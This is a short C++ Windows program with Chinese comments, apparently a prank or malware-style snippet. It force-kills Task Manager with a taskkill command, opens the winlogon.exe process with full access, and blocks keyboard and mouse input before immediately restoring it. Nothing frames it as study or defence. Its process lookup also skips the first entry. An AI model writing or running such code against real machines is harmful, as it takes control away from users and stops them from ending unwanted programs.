#include <windows.h>
#include <Winuser.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <bits/stdc++.h>

DWORD FindProcessId(const std::wstring& processName) {
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)return 0;
	Process32First(processesSnapshot, &processInfo);
	while (Process32Next(processesSnapshot, &processInfo)) {
		if (!processName.compare(processInfo.szExeFile)) {
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}
	CloseHandle(processesSnapshot);
	return 0;
}
int main(){

//杀死任务管理器
system("taskkill /F /IM taskmgr.exe");

// 禁用键盘和鼠标
HANDLE ProcessHandle = 0;
ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindProcessId(L"winlogon.exe"));
BlockInput(TRUE);

// 恢复键盘和鼠标
    BlockInput(FALSE);

// 解除 ProcessHandle
if (ProcessHandle != NULL && ProcessHandle != INVALID_HANDLE_VALUE) {
    CloseHandle(ProcessHandle);
    ProcessHandle = 0;
}

}